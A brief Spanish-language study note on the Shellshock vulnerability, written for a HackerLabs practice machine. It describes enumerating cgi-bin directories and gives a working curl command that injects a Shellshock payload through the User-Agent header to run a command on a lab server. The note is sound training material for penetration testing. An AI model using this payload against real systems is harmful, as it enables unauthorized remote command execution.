- Tags : #shellshock #recursos_hackerlabs 

Es una vulnerabilidad que permite ejecución de comandos dentro de una session 

**Recurso**: Maquina JaulaCon hackerlabs

Revisamos en los servidores webs una carpeta llamada *cgi-bin*  que es una que almacena scripts ejecutables. Si vemos aquí script pues probamos la vulnerabilidad shellchock . 
Haremos búsqueda de directorios con gobuster o con dirb hasta encontrar un archivo cgi para mediante burpsuit inyectar el payload que determinemos

![](../../../attachments/Pasted%20image%2020260217115213.png)

Tambien podemos ejecutarla con el comando curl 
```bash
curl -H "User-Agent: () { :; }; echo; /usr/bin/whoami" 'http://192.168.0.104:8080/cgi-bin/agua.cgi'
```

![](../../../attachments/Pasted%20image%2020260217120144.png)